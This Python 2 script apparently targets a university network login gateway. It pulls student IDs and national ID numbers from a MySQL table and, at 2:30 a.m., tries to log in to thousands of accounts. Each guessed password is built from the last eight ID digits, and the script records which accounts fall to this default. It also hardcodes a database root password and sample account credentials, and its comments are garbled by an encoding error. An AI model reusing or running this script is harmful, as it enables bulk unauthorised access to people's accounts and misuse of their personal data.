#!/usr/bin/python  
# -*- coding: cp936 -*- 
import HTMLParser  
import urlparse  
import urllib  
import urllib2  
import cookielib  
import string  
import re
import MySQLdb
import hashlib       #���˸�������� �������е�md5
import datetime
import time
import sys
'''stdout = sys.stdout  
reload(sys) 
sys.setdefaultencoding('utf-8')  #���Unicode��������
sys.stdout = stdout             #�������sys ��print�޷����'''
  
login_url = 'http://202.112.136.131/cgi-bin/do_login'     #action��ߵĵ�ַ��������network����post����
post_url = 'http://202.112.136.131/phone/index.php'
  
headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1',  
           'Referer' : 'http://buaalib.com/'
            }
'''postData = {'txtuser' : 'ZY1421133',  
            'txtpwd' : 'ZY1421133', 
            }'''



global postData
global conn,cur
conn=MySQLdb.connect(host="localhost",port=3306,user="root",passwd="0792",db="pyspider")
#�����α�����൱��ADO�ļ�¼��
cur=conn.cursor()
global userID
def getuser():
   global userID
   #sql="select stuID from buaauser_select where stuID ='ZY1421133'"
   sql='select stuID,stuIDNum from buaauser_select where length(stuIDNum)>1 and SUBSTRING(stuID FROM 3 FOR 2)="'"15"'"'
   cur.execute(sql)
        #ȡ�����м�¼�����ص���һ������tuple��list��list��Ԫ���Ǽ�¼�У�tuple��Ԫ����ÿ�м�¼���ֶ�
        #ֻ��ִ����������������Ĳ���������Ч������쳣��������ʵ��pymssql���������
   userID=cur.fetchall()
   print len(userID)
   #print cur.fetchone()[0]
   #for stuID in cur.fetchall():
      #print str(stuID[0]).decode('utf-8')#����(u'\u6210\u6881        ',),��stuID[0]�Ϳ�����������
   conn.commit()
        #�ر����ݿ������
   conn.close()
 



def getcookie(login_url,postData):
  #cj = cookielib.LWPCookieJar("cookie_GW.txt")
  cj = cookielib.LWPCookieJar("cookie_GW.txt")
  cookie_support = urllib2.HTTPCookieProcessor(cj)  
  opener = urllib2.build_opener(cookie_support)

  postdata = urllib.urlencode(postData)
  request = urllib2.Request(login_url, postdata, headers)  
  response = opener.open(request).read()
  return response

  if cj:
    cj.save(ignore_discard=True, ignore_expires=True)
    #print "right"
  else:
     print "cookie error"
  
def getinfo(post_url,user):
   cookie = cookielib.LWPCookieJar()
   cookie.load('cookie_GW.txt', ignore_discard=True, ignore_expires=True) 
   req = urllib2.Request(post_url)
  
   opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))

   response = opener.open(req)
   #page=response.read().decode('utf-8')
   page=response.read()
   print page
   #�����ж��Ƿ񷵻���ȷҳ��
   pattern1 = re.compile(r'<span id="bookcartCount">.*?<font color="blue">(.*?)</font>',re.S)
   result1 = re.findall(pattern1,page)
   id1=91158
   if len(result1[0])>1:
        #print result[2],len(result[15]),result[16],result[17],result[20],result[22],len(result[24]),result[25],str(result[2])
        conn=MySQLdb.connect(host="localhost",port=3306,user="root",passwd="0792",db="pyspider")
       #�����α�����൱��ADO�ļ�¼��
        cur=conn.cursor()
        sql1="update buaauser_select set gwpwd=%s,gwMode=%s where stuID=%s"
        cur.execute(sql1,("09272271","N",user))
        #sql1="update buaauser_select set gwpwd=%s,gwMode=%s where stuID=%s"
        #cur.execute(sql1,(str(result[20]).decode('utf-8'),str(result[17]).decode('utf-8'),str(result[21]).decode('utf-8'),str(result[25]).decode('utf-8'),str(result[24]).decode('utf-8'),result[16],"N",str(result[2])))
        conn.commit()
        conn.close()
   else:
        print 'ҳ���ʧ��'
        conn=MySQLdb.connect(host="localhost",port=3306,user="root",passwd="0792",db="pyspider")
       #�����α�����൱��ADO�ļ�¼��
        cur=conn.cursor()
        sql="update buaauser_select set gwMode=%s where stuID=%s"
        cur.execute(sql,("Y",user))
        conn.commit()
        conn.close()
def set_md5(string):
    m=hashlib.md5()
    m.update(string)
    psw=m.hexdigest()[8:-8]         #���ȡ�м��16λ
    return psw
def print_test(url):
    page=urllib.urlopen(url)
    html=page.read()
    return html
def login_out(str):
    #get��ʽ�����ݵ���ַ
    login_url='http://202.112.136.131/cgi-bin/do_logout?action=logout'
    out_data={'action':'loginout'}

def set_gwmode(gwpsd,YorN,user):
        conn=MySQLdb.connect(host="localhost",port=3306,user="root",passwd="0792",db="pyspider")
       #�����α�����൱��ADO�ļ�¼��
        cur=conn.cursor()
        sql1="update buaauser_select set gwpwd=%s,gwMode=%s where stuID=%s"
        cur.execute(sql1,(gwpsd,YorN,user))
        conn.commit()
        conn.close()

def waitrun():
   halfnight=datetime.datetime.replace(datetime.datetime.now() + datetime.timedelta(days=0), hour=2, minute=30, second=0)
   delta = halfnight - datetime.datetime.now()
   time.sleep(delta.seconds)
   
i=0

waitrun()    
getuser()
print len(userID),userID[0][0].swapcase(),userID[0][1][10:]#id����ĸתСд��ȡIDNum�еĺ�8λ
print userID[3][0],str(userID[3][0])
#for i range(0,21472):
while i<3383:	           #4371
    #print str(userID[i][0])#�δ����˿ո�
    postData = {'action':'login',
               'username' : str(userID[i][0]).replace(' ','').swapcase(),  
                'password' : set_md5(str(userID[i][1][10:])),
                'type':'1'
                }
    #print postData
    print i
    response_data=getcookie(login_url,postData)
    if(response_data=='password_error'):
       set_gwmode('','Y',str(userID[i][0]).replace(' ',''))
      
    else:
         set_gwmode(str(userID[i][1][10:]),'N',str(userID[i][0]).replace(' ',''))
         print response_data

    i+=1                
print "finnish"
'''postData = {'action':'login',
              'username' : 'sy1403201',  
                'password' : '13a179b5c1f4a9b5',
                'type':'1'
                }'''

#print html
#set_md5('09272271')
#print postData            #��������һ����½

